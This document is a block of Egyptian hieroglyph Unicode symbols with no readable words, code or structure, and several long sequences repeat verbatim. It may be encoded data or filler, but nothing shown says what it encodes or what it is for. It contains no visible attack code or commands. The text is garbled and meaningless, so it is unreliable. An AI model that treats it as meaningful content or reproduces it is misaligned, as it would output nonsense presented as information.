𓆛𓏩𓌙𓍸𓀐𓍽𓆙𓅸𓃇𓀀𓂺𓈔𓂵𓏖𓇡𓀘𓈐𓂐𓎅𓋟𓅩𓐥𓄏𓌈𓋝𓇰𓎡𓆧𓂟𓂋𓏬𓃯𓏰𓈃𓈍𓋶𓇖𓎄𓎏𓎈𓎻𓆁𓅚𓁱𓆚𓉋𓍚𓆺𓇸𓊗𓋔𓉔𓁹𓍹𓍒𓅶𓎩𓏁𓊚𓌆𓐣𓋋𓏹𓄖𓈜𓐍𓇛𓀽𓆒𓉠𓐭𓍾𓂩𓎔𓂰𓈽𓀶𓋒𓄽𓏪𓀬𓀗𓐔𓈗𓌨𓌜𓎞𓆴𓂦𓆥𓋯𓅇𓏺𓈢𓀏𓌳𓋳𓉑𓏑𓅬𓊫𓏂𓆽𓃣𓇔𓌵𓊅𓌢𓌀𓃢𓍍𓎤𓏿𓇴𓊠𓍧𓁽𓍞𓂆𓍦𓂁𓆓𓆵𓈂𓈴𓆗𓍓𓌎𓋀𓂥𓀖𓇲𓃄𓈪𓍔𓀃𓁎𓃭𓀜𓉗𓇬𓆰𓋵𓐐𓌬𓏐𓌤𓆢𓃟𓃲𓍰𓏙𓏎𓐟𓍘𓄋𓂡𓈥𓈛𓌑𓃸𓏼𓁏𓍩𓃘𓏯𓅃𓎋𓋤𓃻𓌷𓉾𓋹𓉫𓍥𓈤𓆅𓃜𓎦𓈀𓀯𓌻𓈾𓃹𓆤𓍖𓌕𓄁𓉼𓌁𓂕𓋑𓅍𓊶𓀚𓅧𓁍𓉺𓇽𓁑𓏒𓐆𓐄𓆜𓐇𓎍𓏕𓄤𓊭𓆋𓁇𓃺𓊣𓅺𓋙𓊈𓉃𓂲𓆾𓁟𓎥𓏥𓅱𓏏𓍊𓅐𓊩𓀪𓋊𓂮𓊹𓌴𓌘𓁣𓁚𓊃𓄇𓍿𓁋𓊛𓍢𓀷𓍪𓁺𓉮𓁝𓈏𓐚𓏓𓌌𓎸𓃉𓀰𓌉𓁄𓋢𓏠𓏛𓇘𓄸𓃀𓌮𓊖𓂹𓌊𓍱𓌰𓊸𓆪𓋂𓅡𓏋𓀙𓏾𓍮𓐁𓀋𓌼𓆎𓊋𓋒𓐅𓉁𓐈𓌖𓄱𓄿𓄬𓂤𓈖𓈠𓉈𓏬𓆷𓎁𓐨𓇦𓋔𓀽𓇿𓋓𓇝𓌶𓄰𓃧𓆹𓌵𓀞𓈋𓉙𓂑𓅌𓌠𓎭𓋗𓈪𓄠𓀮𓋱𓀑𓂸𓇪𓋪𓀦𓄙𓋊𓂫𓊸𓃬𓂄𓄸𓆑𓄕𓉔𓍥𓍗𓁶𓂹𓀳𓎿𓋙𓌺𓏃𓁺𓏼𓅇𓇷𓆪𓆩𓊬𓆞𓎶𓂞𓁤𓌘𓆉𓃽𓍤𓎲𓊦𓏾𓁏𓂳𓅸𓉻𓁿𓏅𓈀𓆆𓆺𓍪𓋼𓆿𓏽𓋎𓃄𓀷𓊙𓌽𓃈𓊐𓈮𓃌𓐖𓍩𓍞𓆔𓄭𓎤𓏘𓁗𓆵𓌲𓀕𓋁𓇍𓊖𓀨𓍧𓃑𓁝𓅿𓐎𓀹𓅵𓊤𓉿𓅺𓃨𓌞𓄗𓋖𓇼𓆟𓆝𓃢𓐥𓈸𓀻𓅚𓐧𓂒𓁁𓁋𓐘𓋧𓎥𓀡𓅈𓃃𓄯𓎒𓅠𓉹𓊄𓋇𓀣𓐋𓐤𓂾𓈍𓁀𓉕𓆋𓅡𓃝𓆨𓀎𓃞𓏒𓈂𓌍𓇂𓏡𓍉𓅘𓇩𓇃𓃒𓏩𓀴𓋚𓅃𓊻𓇵𓄑𓌤𓍝𓁨𓊊𓈚𓇑𓈊𓎉𓈗𓃺𓍱𓇀𓊀𓏀𓄅𓌷𓀤𓇉𓆫𓎷𓌩𓂢𓀒𓎙𓊽𓀲𓄣𓁦𓉒𓁯𓀸𓂇𓎅𓇊𓆛𓌜𓏟𓇌𓋻𓂠𓐏𓂘𓏐𓁻𓐩𓊩𓏤𓂂𓏁𓃍𓏫𓏳𓏰𓎳𓊲𓃟𓉰𓀪𓍒𓃻𓄎𓆦𓎛𓋛𓈳𓄇𓄵𓋘𓈇𓃲𓃊𓇮𓆓𓐓𓇶𓃉𓋰𓄩𓈎𓃔𓀂𓂮𓁘𓁧𓁓𓆡𓅟𓊚𓐝𓀩𓇛𓈺𓀉𓏻𓀢𓅹𓇥𓀓𓀗𓐑𓈛𓍴𓆻𓅥𓇜𓏌𓀝𓂡𓏯𓈽𓂟𓇺𓆾𓇄𓆽𓈓𓃶𓐊𓄺𓈱𓋤𓅩𓁡𓂏𓎵𓇞𓎗𓂗𓎹𓉲𓂌𓄪𓆌𓏓𓍡𓊨𓍠𓄖𓅽𓂅𓋶𓇨𓇐𓉱𓍄𓀥𓍚𓉊𓆕𓉂𓏕𓅆𓎧𓅎𓐒𓄢𓃫𓁢𓉭𓂦𓇴𓏭𓊈𓎡𓏱𓌈𓌭𓅒𓂔𓐇𓍋𓆭𓆄𓌬𓂭𓃇𓃀𓎦𓂚𓄛𓐮𓃪𓍃𓈟𓆏𓇈𓋦𓈩𓇠𓊞𓆈𓊘𓃥𓀵𓉺𓆢𓍳𓌃𓃆𓌙𓈬𓇰𓋠𓈫𓎐𓆤𓉅𓆊𓄴𓋥𓋿𓄐𓋩𓊜𓁙𓌆𓂺𓆀𓍑𓏑𓆬𓁕𓅤𓁹𓍌𓆇𓍵𓉪𓃭𓋷𓅯𓈦𓇱𓀈𓇫𓁪𓅔𓄏𓏶𓍆𓅝𓋏𓈢𓀋𓉌𓁽𓋸𓏿𓎊𓁔𓊣𓏧𓉷𓅖𓀧𓐛𓀔𓐄𓉩𓐐𓂁𓄒𓊧𓆅𓅏𓅮𓎟𓄉𓄮𓁃𓆥𓎺𓀭𓃕𓌑𓊡𓉟𓊴𓎝𓐁𓎜𓎖𓏆𓃅𓃂𓏷𓌢𓁌𓅪𓅶𓁜𓀄𓈾𓋆𓋌𓐪𓀼𓐗𓎫𓍰𓅷𓃦𓆘𓋣𓍣𓅫𓈜𓋞𓁟𓏛𓏗𓀰𓃠𓏄𓎔𓐚𓌐𓂥𓌝𓌳𓌒𓂀𓍦𓋹𓃮𓏲𓉃𓋋𓃡𓇳𓎆𓁆𓅳𓃤𓁎𓊒𓏈𓆁𓈹𓌕𓏹𓁑𓁮𓇟𓂈𓇢𓁒𓊵𓍬𓆃𓎰𓁐𓍿𓌟𓋳𓂼𓅱𓇒𓎞𓄦𓃐𓁉𓉬𓂿𓎼𓋃𓏸𓏮𓌎𓃴𓇤𓈙𓍊𓍔𓄳𓇎𓉖𓄝𓈅𓎋𓀁𓁊𓋟𓉞𓇧𓅅𓐙𓊱𓋲𓍨𓁼𓇚𓁫𓀫𓊎𓈲𓊾𓌹𓍂𓊁𓏢𓆙𓋡𓇲𓄨𓉳𓋬𓎂𓆶𓎓𓈈𓁂𓍈𓏴𓄃𓆗𓍓𓌎𓋀𓂥𓀖𓇲𓃄𓈪𓍔𓀃𓁎𓃭𓀜𓉗𓇬𓆰𓋵𓐐𓌬𓏐𓌤𓆢𓃟𓃲𓍰𓏙𓏎𓐟𓍘𓄋𓂡𓈥𓈛𓌑𓃸𓏼𓁏𓍩𓃘𓏯𓅃𓎋𓋤𓃻𓌷𓉾𓋹𓉫𓍥𓈤𓆅𓃜𓎦𓈀𓀯𓌻𓈾𓃹𓆤𓍖𓌕𓄁𓉼𓌁𓂕𓋑𓅍𓊶𓀚𓅧𓁍𓉺𓇽𓁑𓏒𓐆𓐄𓆜𓐇𓎍𓏕𓄤𓊭𓆋𓁇𓃺𓊣𓅺𓋙𓊈𓉃𓂲𓆾𓁟𓎥𓏥𓅱𓏏𓍊𓅐𓊩𓀪𓋊𓂮𓊹𓌴𓌘𓁣𓁚𓊃𓄇𓍿𓁋𓊛𓍢𓀷𓍪𓁺𓉮𓁝𓈏𓐚𓏓𓌌𓎸𓃉𓀰𓌉𓁄𓋢𓏠𓏛𓇘𓄸𓃀𓌮𓊖𓂹𓌊𓍱𓌰𓊸𓆪𓋂𓅡𓏋𓀙𓏾𓍮𓐁𓀋𓌼𓆎𓊋𓋒𓐅𓉁𓐈𓌖𓄱𓄿𓄬𓂤𓈖𓈠𓉈𓏬𓆷𓅛𓎢𓋅𓂉𓁇𓅲𓉯𓎈𓐣𓋍𓇾𓐍𓆒𓀖𓈯𓃱𓍏𓐠𓎌𓏨𓄶𓇁𓍹𓌣𓏝𓆍𓄀𓈨𓀱𓆰𓍫𓅉𓊺𓊅𓉀𓊪𓌛𓊷𓅀𓄧𓂙𓁰𓆸𓁈𓅓𓊑𓏊𓋯𓀆𓈿𓍓𓂲𓍷𓌓𓐆𓂰𓁱𓅰𓆧𓄓𓀛𓉏𓁷𓀘𓊍𓌥𓌋𓎇𓉎𓎸𓂷𓉓𓌰𓇆𓉣𓇘𓌸𓀜𓂻𓄁𓎻𓄷𓉋𓍲𓎬𓇕𓇔𓅄𓉥𓉍𓎯𓉫𓉾𓌗𓁠𓄄𓉑𓌱𓋺𓌊𓅞𓀏𓃩𓊛𓋢𓎕𓐂𓈉𓋐𓊔𓈻𓁖𓃿𓃷𓁛𓀟𓃾𓉨𓋵𓎏𓐔𓏦𓂍𓃏𓋨𓁣𓋉𓌮𓀺𓃣𓁳𓅑𓈔𓅂𓐀𓀠𓎮𓄹𓄘𓍕𓄊𓅍𓆲𓃼𓈝𓈡𓊌𓁞𓋮𓉶𓍼𓀌𓊟𓇇𓂶𓉚𓉗𓋜𓇓𓄤𓆣𓂨𓊆𓄔𓆖𓐟𓀬𓀐𓎾𓇗𓅼𓄌𓄈𓍎𓆯𓄻𓀃𓅢𓅧𓍐𓌚𓁩𓌪𓍁𓇡𓀙𓄟𓆮𓋀𓌅𓂪𓊼𓍽𓊓𓀅𓌀𓋽𓏜𓂊𓍢𓁍𓐜𓅭𓇻𓌏𓃎𓏖𓋝𓐃𓏎𓈄𓅬𓌾𓁭𓊳𓅾𓃸𓎑𓊢𓇸𓍾𓏪𓎣𓈒𓅕𓄍𓂋𓈁𓂝𓉧𓁴𓎃𓋈𓌄𓉢𓊝𓏇𓃓𓈕𓉤𓃙𓁲𓄫𓌨𓌧𓉄𓉇𓏔𓊃𓉐𓁸𓎱𓇙𓊗𓏵𓀶𓈼𓏞𓃰𓂓𓈤𓇬𓏂𓏺𓀀𓊯𓐡𓎚𓅐𓈑𓈧𓏉𓌌𓏣𓂽𓉼𓎨𓈐𓄽𓍛𓎩𓍘𓌴𓂧𓇏𓊥𓍙𓍸𓆳𓉸𓏍𓂃𓄆𓅜𓌔𓅻𓂆𓄜𓇽𓁄𓊶𓎎𓃘𓈷𓐌𓄡𓅊𓏥𓈥𓂬𓅦𓉽𓊮𓉠𓆜𓐉𓉵𓆠𓇖𓎪𓃯𓍯𓁾𓈆𓂩𓆼𓀇𓎽𓐦𓄞𓁬𓊭𓊏𓍅𓋭𓃛𓏋𓃗𓎄𓌻𓄚𓉴𓊿𓂴𓈃𓀚𓍍𓌿𓃚𓐬𓂐𓐢𓌡𓅗𓈴𓇣𓅣𓂕𓀍𓈭𓃖𓂛𓅁𓈣𓌫𓐫𓄲𓁥𓉮𓍖𓆐𓄋𓄥𓊕𓎘𓎀𓍀𓋫𓀯𓇭𓃵𓈏𓋂𓀿𓅙𓇹𓆂𓂵𓌉𓏚𓁵𓆚𓈵𓏏𓂣𓃁𓎴𓂎𓉘𓍭𓃳𓏠𓌂𓀾𓈞𓌁𓄂𓁅𓅋𓍮𓇅𓆗𓐕𓇯𓃹𓄾𓉦𓊫𓅴𓉆𓍜𓊠𓆴𓀊𓋾𓅨𓎠𓐭𓈰𓋑𓉡𓌯𓂯𓃋𓈌𓊰𓈘𓁚𓍟𓍶𓂱𓄼𓋕𓋄𓂖𓐞𓋴𓊹𓃜𓌦𓈶𓏙𓂜𓌇𓇋𓉉𓎍𓆱𓌳𓌒𓂀𓍦𓁜𓀄𓈾𓋆𓋌𓐪𓀼𓐗𓎫𓉰𓀪𓍒𓃻𓄎𓆦𓄊𓅍𓆲𓃼𓇑𓏇𓅳𓄥𓊑𓍲𓋐𓉖𓐤𓎱𓁜𓈺𓀉𓏻𓀢𓅹𓇥𓀓𓀗𓐞𓃆𓁕𓐜𓊾𓀩𓏲𓋺𓌊𓅞𓀏𓄡𓅊𓁓𓇹𓇈𓆭𓀇𓇫𓍨𓇣𓆲𓅜𓏘𓌧𓉴𓏣𓏞𓍛𓎨𓁔𓏨𓊙𓌖𓍴𓈈𓄧𓃅𓌄𓅥𓌣𓁛𓆘𓅨𓉯𓇞𓅪𓄘𓁼𓂱𓈞𓄀𓏡𓇻𓆂𓅽𓏻𓄰𓀈𓂈𓈉𓉓𓇋𓁨𓉪𓉤𓂍𓉀𓃐𓃕𓃼𓄬𓇼𓊍𓊤𓂤𓁢𓅦𓎠𓈯𓈝𓂿𓌭𓊬𓉿𓄷𓉄𓊀𓈵𓌸𓂽𓌚𓏳𓋠𓉇𓂳𓅴𓇂𓈷𓏫𓁴𓏈𓍎𓅛𓎀𓐙𓅀𓈡𓀎𓌃𓐌𓋿𓃷𓄣𓁰𓅗𓎿𓏶𓌽𓄦𓆑𓂑𓅊𓀥𓍼𓀮𓉈𓀟𓎒𓅎𓐝𓎁𓏚𓄒𓏆𓉥𓅠𓈻𓈲𓊒𓐦𓁊𓅔𓏭𓎖𓃔𓐊𓎺𓋭𓁯𓃃𓈱𓃖𓇑𓏇𓅳𓄥𓊑𓍲𓋐𓉖𓐤𓎱𓁜𓏤𓅾𓀭𓏵𓊟𓍏𓌂𓁐𓆟𓊘𓂊𓅢𓂚𓎲𓉙𓄎𓊡𓃾𓁖𓇒𓋼𓋄𓆎𓂭𓇱𓌥𓌱𓏌𓍬𓁙𓏢𓆊𓅤𓀾𓌗𓁡𓍗𓈭𓏄𓐎𓇾𓇮𓄼𓊽𓃬𓁃𓐏𓄢𓁻𓄙𓍭𓃪𓀸𓄲𓆸𓄃𓇿𓋫𓎆𓌫𓉲𓈸𓋕𓉌𓌪𓎫𓐉𓇳𓀆𓎼𓂔𓈬𓐫𓌓𓂧𓂃𓋅𓁿𓈺𓊦𓐓𓋬𓍫𓆣𓆞𓎾𓀤𓆄𓎷𓈙𓆨𓉨𓋗𓎝𓆏𓄪𓌲𓋾𓈎𓉢𓏽𓅋𓄑𓍉𓆻𓇧𓉳𓄜𓁞𓐀𓊱𓅟𓐞𓃆𓁕𓐜𓊾𓀩𓏲𓉆𓈆𓁒𓌏𓏉𓈫𓅂𓀂𓂶𓋴𓌋𓍳𓄌𓋺𓆷𓉂𓀅𓀹𓇎𓊲𓂙𓎽𓂝𓄻𓉷𓍂𓃨𓅏𓌡𓏝𓎌𓎜𓀊𓂸𓏮𓌟𓉎𓊴𓊮𓇺𓋌𓊋𓊊𓁬𓄠𓍁𓂣𓆆𓍀𓌿𓂞𓀍𓅮𓉅𓃞𓐠𓎗𓁶𓌠𓏧𓀱𓇊𓄐𓀕𓃳𓈧𓆿𓍋𓇇𓈟𓋓𓁳𓎐𓐩𓍶𓇭𓋧𓆀𓍷𓄵𓂓𓂘𓊪𓁭𓊿𓃏𓉣𓇯𓆼𓅝𓋈𓍇𓉚𓊓𓈕𓇕𓆔𓁸𓎮𓀧𓐂𓀛𓋚𓇆𓄿𓋣𓁾𓋡𓉍𓉒𓉶𓁲𓅑𓃒𓀲𓃓𓐢𓏟𓀣𓋸𓊨𓈳𓃿𓇥𓁉𓏅𓐒𓁘𓇵𓏱𓃰𓍜𓂨𓉐𓌦𓎵𓆗𓍓𓌎𓋀𓂥𓀖𓇲𓃄𓈪𓍔𓀃𓁎𓃭𓀜𓉗𓇬𓆰𓋵𓐐𓌬𓏐𓌤𓆢𓃟𓃲𓍰𓏙𓏎𓐟𓍘𓄋𓂡𓈥𓈛𓌑𓃸𓏼𓁏𓍩𓃘𓏯𓅃𓎋𓋤𓃻𓌷𓉾𓋹𓉫𓍥𓈤𓆅𓃜𓎦𓈀𓀯𓌻𓈾𓃹𓆤𓍖𓌕𓄁𓉼𓌁𓂕𓋑𓅍𓊶𓀚𓅧𓁍𓉺𓇽𓁑𓏒𓐆𓐄𓆜𓐇𓎍𓏕𓄤𓊭𓆋𓁇𓃺𓊣𓅺𓋙𓊈𓉃𓂲𓆾𓁟𓎥𓏥𓅱𓏏𓍊𓅐𓊩𓀪𓋊𓂮𓊹𓌴𓌘𓁣𓁚𓊃𓄇𓍿𓁋𓊛𓍢𓀷𓍪𓁺𓉮𓁝𓈏𓐚𓏓𓌌𓎸𓃉𓀰𓌉𓁄𓋢𓏠𓏛𓇘𓄸𓃀𓌮𓊖𓂹𓌊𓍱𓌰𓊸𓆪𓋂𓅡𓏋𓀙𓏾𓍮𓐁𓀋𓌼𓆎𓊋𓋒𓐅𓉁𓐈𓌖𓄱𓄿𓄬𓂤𓈖𓈠𓉈𓏬𓆷𓆖𓎳𓋇𓋁𓂜𓂾𓁀𓇷𓏷𓄳𓀝𓆩𓆃𓇩𓎶𓁷𓆇𓌍𓄟𓎂𓋉𓉹𓎣𓊄𓊎𓇉𓉘𓌇𓋽𓊁𓇀𓊵𓊼𓆉𓃩𓉰𓂷𓈚𓆝𓍯𓁪𓎎𓉞𓌒𓈶𓈨𓊳𓊻𓍈𓏃𓂂𓉵𓂏𓌹𓄚𓎟𓎹𓉻𓈄𓋰𓅫𓃌𓅉𓊢𓐃𓃎𓂬𓅷𓀠𓏀𓅯𓄂𓍐𓎓𓃮𓈊𓆠𓉩𓍠𓄆𓌛𓎑𓄴𓃈𓈼𓃧𓈮𓋜𓎧𓊔𓋲𓃙𓄫𓂠𓁤𓐬𓄶𓃥𓃱𓄄𓄔𓇁𓄮𓐋𓉁𓐮𓉏𓎙𓀄𓅕𓍡𓃛𓅣𓄭𓀑𓂉𓃡𓂴𓅰𓎛𓈣𓂖𓈌𓈖𓁥𓅹𓉱𓋘𓐖𓍌𓇗𓊌𓌼𓍄𓈦𓉸𓆮𓃚𓂇𓃫𓈘𓀫𓄹𓇚𓋱𓆡𓐛𓆌𓉟𓇠𓂯𓌔𓐕𓌶𓊕𓇶𓀡𓄊𓅅𓎕𓀢𓐗𓈁𓋃𓏦𓇃𓄍𓀓𓋍𓐈𓍆𓍃𓀨𓊏𓌯𓋷𓆶𓌝𓂪𓆈𓂻𓄗𓇓𓋻𓎭𓃤𓎇𓁁𓅁𓍟𓆯𓁮𓍝𓄅𓎴𓅼𓅲𓅌𓀳𓈹𓏔𓊝𓎪𓄝𓂛𓉧𓀺𓋪𓐪𓀞𓍕𓇦𓇙𓂄𓂎𓌺𓋞𓃍𓀦𓁂𓇤𓋆𓊐𓐡𓃦𓀵𓈋𓏊𓉊𓅖𓅞𓃊𓂅𓇏𓅄𓄺𓆦𓅙𓋖𓐧𓃵𓊺𓀉𓍣𓉕𓂒𓂗𓁅𓋨𓏍𓏴𓎬𓈒𓐅𓄾𓄨𓊰𓌩𓅓𓄛𓇐𓍵𓀴𓅆𓆫𓉦𓎘𓃽𓁠𓈩𓉬𓅻𓄓𓄱𓊷𓅭𓁗𓎃𓅵𓁆𓃝𓈰𓃴𓆳𓄈𓆍𓃠𓃂𓀔𓇅𓀒𓏗𓍑𓂫𓁌𓋥𓀻𓇍𓊜𓎢𓅘𓈇𓏸𓌾𓂌𓋦𓀼𓐘𓆬𓋛𓇪𓂼𓋮𓌅𓈅𓇟𓂀𓉉𓁩𓍙𓃶𓀁𓆕𓄡𓄩𓉭𓊥𓅈𓐑𓇜𓃋𓎉𓁫𓄕𓈑𓃑𓊧𓄞𓍅𓆱𓇄𓉽𓌐𓇌𓂢𓈓𓁦𓈠𓀌𓃁𓉡𓎊𓁈𓇨𓁵𓋎𓇢𓏜𓎚𓅒𓃗𓈿𓆹𓄯𓇝𓆐𓊞𓊯𓋩𓍤𓊆𓀿𓌞𓁧𓋏𓅿𓐨𓄉𓎰𓎯𓆛𓏩𓌙𓍸𓀐𓍽𓆙𓅸𓃇𓀀𓂺𓈔𓂵𓏖𓇡𓀘𓈐𓂐𓎅𓋟𓅩𓐥𓄏𓌈𓋝𓇰𓎡𓆧𓂟𓂋𓏬𓃯𓏰𓈃𓈍𓋶𓇖𓎄𓎏𓎈𓎻𓆁𓅚𓁱𓆚𓉋𓍚𓆺𓇸𓊗𓋔𓉔𓁹𓍹𓍒𓅶𓎩𓏁𓊚𓌆𓐣𓋋𓏹𓄖𓈜𓐍𓇛𓀽𓆒𓉠𓐭𓍾𓂩𓎔𓂰𓈽𓀶𓋒𓄽𓏪𓀬𓀗𓐔𓈗𓌨𓌜𓎞𓆴𓂦𓆥𓋯𓅇𓏺𓈢𓀏𓌳𓋳𓉑𓏑𓅬𓊫𓏂𓆽𓃣𓇔𓌵𓊅𓌢𓌀𓃢𓍍𓎤𓏿𓇴𓊠𓍧𓁽𓍞𓂆𓍦𓂁𓆓𓆵𓈂𓈴𓆗𓍓𓌎𓋀𓂥𓀖𓇲𓃄𓈪𓍔𓀃𓁎𓃭𓀜𓉗𓇬𓆰𓋵𓐐𓌬𓏐𓌤𓆢𓃟𓃲𓍰𓏙𓏎𓐟𓍘𓄋𓂡𓈥𓈛𓌑𓃸𓏼𓁏𓍩𓃘𓏯𓅃𓎋𓋤𓃻𓌷𓉾𓋹𓉫𓍥𓈤𓆅𓃜𓎦𓈀𓀯𓌻𓈾𓃹𓆤𓍖𓌕𓄁𓉼𓌁𓂕𓋑𓅍𓊶𓀚𓅧𓁍𓉺𓇽𓁑𓏒𓐆𓐄𓆜𓐇𓎍𓏕𓄤𓊭𓆋𓁇𓃺𓊣𓅺𓋙𓊈𓉃𓂲𓆾𓁟𓎥𓏥𓅱𓏏𓍊𓅐𓊩𓀪𓋊𓂮𓊹𓌴𓌘𓁣𓁚𓊃𓄇𓍿𓁋𓊛𓍢𓀷𓍪𓁺𓉮𓁝𓈏𓐚𓏓𓌌𓎸𓃉𓀰𓌉𓁄𓋢𓏠𓏛𓇘𓄸𓃀𓌮𓊖𓂹𓌊𓍱𓌰𓊸𓆪𓋂𓅡𓏋𓀙𓏾𓍮𓐁𓀋𓌼𓆎𓊋𓋒𓐅𓉁𓐈𓌖𓄱𓄿𓄬𓂤𓈖𓈠𓉈𓏬𓆷𓎁𓐨𓇦𓋔𓀽𓇿𓋓𓇝𓌶𓄰𓃧𓆹𓌵𓀞𓈋𓉙𓂑𓅌𓌠𓎭𓋗𓈪𓄠𓀮𓋱𓀑𓂸𓇪𓋪𓀦𓄙𓋊𓂫𓊸𓃬𓂄𓄸𓆑𓄕𓉔𓍥𓍗𓁶𓂹𓀳𓎿𓋙𓌺𓏃𓁺𓏼𓅇𓇷𓆪𓆩𓊬𓆞𓎶𓂞𓁤𓌘𓆉𓃽𓍤𓎲𓊦𓏾𓁏𓂳𓅸𓉻𓁿𓏅𓈀𓆆𓆺𓍪𓋼𓆿𓏽𓋎𓃄𓀷𓊙𓌽𓃈𓊐𓈮𓃌𓐖𓍩𓍞𓆔𓄭𓎤𓏘𓁗𓆵𓌲𓀕𓋁𓇍𓊖𓀨𓍧𓃑𓁝𓅿𓐎𓀹𓅵𓊤𓉿𓅺𓃨𓌞𓄗𓋖𓇼𓆟𓆝𓃢𓐥𓈸𓀻𓅚𓐧𓂒𓁁𓁋𓐘𓋧𓎥𓀡𓅈𓃃𓄯𓎒𓅠𓉹𓊄𓋇𓀣𓐋𓐤𓂾𓈍𓁀𓉕𓆋𓅡𓃝𓆨𓀎𓃞𓏒𓈂𓌍𓇂𓏡𓍉𓅘𓇩𓇃𓃒𓏩𓀴𓋚𓅃𓊻𓇵𓄑𓌤𓍝𓁨𓊊𓈚𓇑𓈊𓎉𓈗𓃺𓍱𓇀𓊀𓏀𓄅𓌷𓀤𓇉𓆫𓎷𓌩𓂢𓀒𓎙𓊽𓀲𓄣𓁦𓉒𓁯𓀸𓂇𓎅𓇊𓆛𓌜𓏟𓇌𓋻𓂠𓐏𓂘𓏐𓁻𓐩𓊩𓏤𓂂𓏁𓃍𓏫𓏳𓏰𓎳𓊲𓃟𓉰𓀪𓍒𓃻𓄎𓆦𓎛𓋛𓈳𓄇𓄵𓋘𓈇𓃲𓃊𓇮𓆓𓐓𓇶𓃉𓋰𓄩𓈎𓃔𓀂𓂮𓁘𓁧𓁓𓆡𓅟𓊚𓐝𓀩𓇛𓈺𓀉𓏻𓀢𓅹𓇥𓀓𓀗𓐑𓈛𓍴𓆻𓅥𓇜𓏌𓀝𓂡𓏯𓈽𓂟𓇺𓆾𓇄𓆽𓈓𓃶𓐊𓄺𓈱𓋤𓅩𓁡𓂏𓎵𓇞𓎗𓂗𓎹𓉲𓂌𓄪𓆌𓏓𓍡𓊨𓍠𓄖𓅽𓂅𓋶𓇨𓇐𓉱𓍄𓀥𓍚𓉊𓆕𓉂𓏕𓅆𓎧𓅎𓐒𓄢𓃫𓁢𓉭𓂦𓇴𓏭𓊈𓎡𓏱𓌈𓌭𓅒𓂔𓐇𓍋𓆭𓆄𓌬𓂭𓃇𓃀𓎦𓂚𓄛𓐮𓃪𓍃𓈟𓆏𓇈𓋦𓈩𓇠𓊞𓆈𓊘𓃥𓀵𓉺𓆢𓍳𓌃𓃆𓌙𓈬𓇰𓋠𓈫𓎐𓆤𓉅𓆊𓄴𓋥𓋿𓄐𓋩𓊜𓁙𓌆𓂺𓆀𓍑𓏑𓆬𓁕𓅤𓁹𓍌𓆇𓍵𓉪𓃭𓋷𓅯𓈦𓇱𓀈𓇫𓁪𓅔𓄏𓏶𓍆𓅝𓋏𓈢𓀋𓉌𓁽𓋸𓏿𓎊𓁔𓊣𓏧𓉷𓅖𓀧𓐛𓀔𓐄𓉩𓐐𓂁𓄒𓊧𓆅𓅏𓅮𓎟𓄉𓄮𓁃𓆥𓎺𓀭𓃕𓌑𓊡𓉟𓊴𓎝𓐁𓎜𓎖𓏆𓃅𓃂𓏷𓌢𓁌𓅪𓅶𓁜𓀄𓈾𓋆𓋌𓐪𓀼𓐗𓎫𓍰𓅷𓃦𓆘𓋣𓍣𓅫𓈜𓋞𓁟𓏛𓏗𓀰𓃠𓏄𓎔𓐚𓌐𓂥𓌝𓌳𓌒𓂀𓍦𓋹𓃮𓏲𓉃𓋋𓃡𓇳𓎆𓁆𓅳𓃤𓁎𓊒𓏈𓆁𓈹𓌕𓏹𓁑𓁮𓇟𓂈𓇢𓁒𓊵𓍬𓆃𓎰𓁐𓍿𓌟𓋳𓂼𓅱𓇒𓎞𓄦𓃐𓁉𓉬𓂿𓎼𓋃𓏸𓏮𓌎𓃴𓇤𓈙𓍊𓍔𓄳𓇎𓉖𓄝𓈅𓎋𓀁𓁊𓋟𓉞𓇧𓅅𓐙𓊱𓋲𓍨𓁼𓇚𓁫𓀫𓊎𓈲𓊾𓌹𓍂𓊁𓏢𓆙𓋡𓇲𓄨𓉳𓋬𓎂𓆶𓎓𓈈𓁂𓍈𓏴𓄃𓆗𓍓𓌎𓋀𓂥𓀖𓇲𓃄𓈪𓍔𓀃𓁎𓃭𓀜𓉗𓇬𓆰𓋵𓐐𓌬𓏐𓌤𓆢𓃟𓃲𓍰𓏙𓏎𓐟𓍘𓄋𓂡𓈥𓈛𓌑𓃸𓏼𓁏𓍩𓃘𓏯𓅃𓎋𓋤𓃻𓌷𓉾𓋹𓉫𓍥𓈤𓆅𓃜𓎦𓈀𓀯𓌻𓈾𓃹𓆤𓍖𓌕𓄁𓉼𓌁𓂕𓋑𓅍𓊶𓀚𓅧𓁍𓉺𓇽𓁑𓏒𓐆𓐄𓆜𓐇𓎍𓏕𓄤𓊭𓆋𓁇𓃺𓊣𓅺𓋙𓊈𓉃𓂲𓆾𓁟𓎥𓏥𓅱𓏏𓍊𓅐𓊩𓀪𓋊𓂮𓊹𓌴𓌘𓁣𓁚𓊃𓄇𓍿𓁋𓊛𓍢𓀷𓍪𓁺𓉮𓁝𓈏𓐚𓏓𓌌𓎸𓃉𓀰𓌉𓁄𓋢𓏠𓏛𓇘𓄸𓃀𓌮𓊖𓂹𓌊𓍱𓌰𓊸𓆪𓋂𓅡𓏋𓀙𓏾𓍮𓐁𓀋𓌼𓆎𓊋𓋒𓐅𓉁𓐈𓌖𓄱𓄿𓄬𓂤𓈖𓈠𓉈𓏬𓆷𓅛𓎢𓋅𓂉𓁇𓅲𓉯𓎈𓐣𓋍𓇾𓐍𓆒𓀖𓈯𓃱𓍏𓐠𓎌𓏨𓄶𓇁𓍹𓌣𓏝𓆍𓄀𓈨𓀱𓆰𓍫𓅉𓊺𓊅𓉀𓊪𓌛𓊷𓅀𓄧𓂙𓁰𓆸𓁈𓅓𓊑𓏊𓋯𓀆𓈿𓍓𓂲𓍷𓌓𓐆𓂰𓁱𓅰𓆧𓄓𓀛𓉏𓁷𓀘𓊍𓌥𓌋𓎇𓉎𓎸𓂷𓉓𓌰𓇆𓉣𓇘𓌸𓀜𓂻𓄁𓎻𓄷𓉋𓍲𓎬𓇕𓇔𓅄𓉥𓉍𓎯𓉫𓉾𓌗𓁠𓄄𓉑𓌱𓋺𓌊𓅞𓀏𓃩𓊛𓋢𓎕𓐂𓈉𓋐𓊔𓈻𓁖𓃿𓃷𓁛𓀟𓃾𓉨𓋵𓎏𓐔𓏦𓂍𓃏𓋨𓁣𓋉𓌮𓀺𓃣𓁳𓅑𓈔𓅂𓐀𓀠𓎮𓄹𓄘𓍕𓄊𓅍𓆲𓃼𓈝𓈡𓊌𓁞𓋮𓉶𓍼𓀌𓊟𓇇𓂶𓉚𓉗𓋜𓇓𓄤𓆣𓂨𓊆𓄔𓆖𓐟𓀬𓀐𓎾𓇗𓅼𓄌𓄈𓍎𓆯𓄻𓀃𓅢𓅧𓍐𓌚𓁩